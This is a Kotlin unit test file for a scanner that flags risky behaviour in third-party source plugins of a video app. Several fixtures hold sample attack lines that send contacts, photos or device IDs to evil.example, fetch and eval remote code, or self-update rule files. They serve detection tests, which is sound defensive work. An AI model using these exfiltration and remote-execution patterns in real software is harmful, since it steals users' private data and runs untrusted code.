package com.movieshell.data.source

import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class SourceRiskScannerTest {

    private val cleanJs = """
        var rule = {
            title: '测试源',
            host: 'https://example.com',
            homeContent: function() { return fetch('https://example.com/'); },
        };
    """.trimIndent()

    @Test
    fun cleanSource_hasNoFindings() {
        val report = SourceRiskScanner.scanText(cleanJs)
        assertTrue(report.findings.isEmpty())
        assertFalse(report.hasHighRisk)
    }

    @Test
    fun contactsPlusNetwork_isHighRisk() {
        val content = """
            var c = contentResolver.query(content://com.android.contacts, null, null, null, null);
            fetch('https://evil.example/upload', { method: 'POST', body: JSON.stringify(c) });
        """.trimIndent()
        val report = SourceRiskScanner.scanText(content)
        assertTrue(report.hasHighRisk)
        val f = report.findings.first { it.ruleId == "sensitive_exfil" }
        assertEquals(SourceRiskScanner.Severity.HIGH, f.severity)
        assertEquals(1, f.line)
    }

    @Test
    fun contactsAlone_isMediumOnly() {
        val content = "var c = contentResolver.query(content://com.android.contacts, null, null, null, null);"
        val report = SourceRiskScanner.scanText(content)
        assertFalse(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "read_sensitive" })
    }

    @Test
    fun evalPlusNetwork_isHighRisk() {
        val content = """
            fetch('https://evil.example/code.js').then(r => r.text()).then(t => eval(t));
        """.trimIndent()
        val report = SourceRiskScanner.scanText(content)
        assertTrue(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "remote_code_exec" })
    }

    @Test
    fun evalAlone_isMediumOnly() {
        val report = SourceRiskScanner.scanText("var x = eval('1+1');")
        assertFalse(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "exec_local" })
    }

    @Test
    fun selfUpdate_isHighRisk() {
        val content = """
            import requests
            data = requests.get('https://evil.example/update.py').content
            open('/data/rule.py', 'wb').write(data)
        """.trimIndent()
        val report = SourceRiskScanner.scanText(content)
        assertTrue(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "self_update" })
    }

    @Test
    fun downloadVideo_isNotSelfUpdate() {
        // 下视频写 .mp4 不算写代码文件，不触发自更新。
        val content = """
            import requests
            data = requests.get('https://example.com/v.mp4').content
            open('/sdcard/v.mp4', 'wb').write(data)
        """.trimIndent()
        val report = SourceRiskScanner.scanText(content)
        assertFalse(report.findings.any { it.ruleId == "self_update" })
    }

    @Test
    fun installApk_isHighRisk() {
        val content = "Intent(Intent.ACTION_INSTALL_PACKAGE, Uri.parse('file:///x.apk'))"
        val report = SourceRiskScanner.scanText(content)
        assertTrue(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "install_apk" })
    }

    @Test
    fun subprocessAlone_isMediumOnly() {
        // 喜马拉雅书源调本地命令是正常用法：只记中危，不拦路。
        val content = "r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)"
        val report = SourceRiskScanner.scanText(content)
        assertFalse(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "exec_local" })
    }

    @Test
    fun androidIdLiteral_isNotDeviceRead() {
        // 橘汁 4K 自生成随机 id、聚合短剧发写死的设备号：只是字符串，不算读手机。
        val content = """
            self.android_id = secrets.token_hex(8).encode()
            body = json.dumps({'android_id': '8f7db6f23d745890', 'device': '22ebfeec'})
            requests.post('https://example.com/api', json=body)
        """.trimIndent()
        val report = SourceRiskScanner.scanText(content)
        assertFalse(report.findings.any { it.ruleId == "sensitive_exfil" || it.ruleId == "read_sensitive" })
    }

    @Test
    fun realDeviceIdRead_isFlagged() {
        val content = """
            String id = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
            post('https://evil.example/', id);
        """.trimIndent()
        val report = SourceRiskScanner.scanText(content)
        assertTrue(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "sensitive_exfil" })
    }

    @Test
    fun readCappedBytes_overLimitReturnsNull() {
        val big = ByteArray(SourceRiskScanner.MAX_SCAN_BYTES + 1) { 65 }
        val out = SourceRiskScanner.readCappedBytes(big.inputStream())
        assertEquals(null, out)
        val small = "hello".toByteArray().inputStream()
        assertEquals("hello", SourceRiskScanner.readCappedBytes(small)?.toString(Charsets.UTF_8))
    }

    private fun makeJar(vararg entries: Pair<String, ByteArray>): ByteArray {
        val bos = ByteArrayOutputStream()
        ZipOutputStream(bos).use { zos ->
            for ((name, bytes) in entries) {
                zos.putNextEntry(ZipEntry(name))
                zos.write(bytes)
                zos.closeEntry()
            }
        }
        return bos.toByteArray()
    }

    @Test
    fun scanJar_execInDex_isHighRisk() {
        val dex = "Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process; https://evil.example/x"
            .toByteArray(Charsets.ISO_8859_1)
        val jar = makeJar("classes.dex" to dex)
        val report = SourceRiskScanner.scanJar(jar)
        assertTrue(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "remote_code_exec" })
    }

    @Test
    fun scanJar_soEntry_isMedium() {
        val jar = makeJar("lib/arm64-v8a/libevil.so" to byteArrayOf(1, 2, 3))
        val report = SourceRiskScanner.scanJar(jar)
        assertFalse(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "native_lib" })
    }

    @Test
    fun scanJar_notAZip_reportsUnscannable() {
        val report = SourceRiskScanner.scanJar("this is not a jar".toByteArray())
        assertFalse(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "jar_unscannable" })
    }

    // v1.3.25 审查修（GPT H-01）：PY 书源 open() 读照片路径再 post 外发，以前零命中。
    @Test
    fun pyOpenStoragePhotoPlusPost_isHighRisk() {
        val content = """
            import requests
            data = open('/storage/emulated/0/DCIM/IMG_001.jpg', 'rb').read()
            requests.post('https://evil.example/upload', data=data)
        """.trimIndent()
        val report = SourceRiskScanner.scanText(content)
        assertTrue(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "sensitive_exfil" })
    }

    @Test
    fun fileInputStreamPlusNetwork_isHighRisk() {
        val content = "byte[] d = new FileInputStream(\"/sdcard/a.jpg\").readAllBytes(); post(\"https://evil.example/\", d);"
        val report = SourceRiskScanner.scanText(content)
        assertTrue(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "sensitive_exfil" })
    }

    // v1.3.25 审查修（GPT M-05）：单个 dex 解压后超 16MB，不再无上限读进内存。
    @Test
    fun scanJar_overCapDex_reportsMedium() {
        val bigDex = ByteArray(SourceRiskScanner.MAX_DEX_BYTES + 1) { 0 }
        val jar = makeJar("classes.dex" to bigDex)
        val report = SourceRiskScanner.scanJar(jar)
        assertFalse(report.hasHighRisk)
        assertTrue(report.findings.any { it.ruleId == "dex_over_cap" })
    }
}
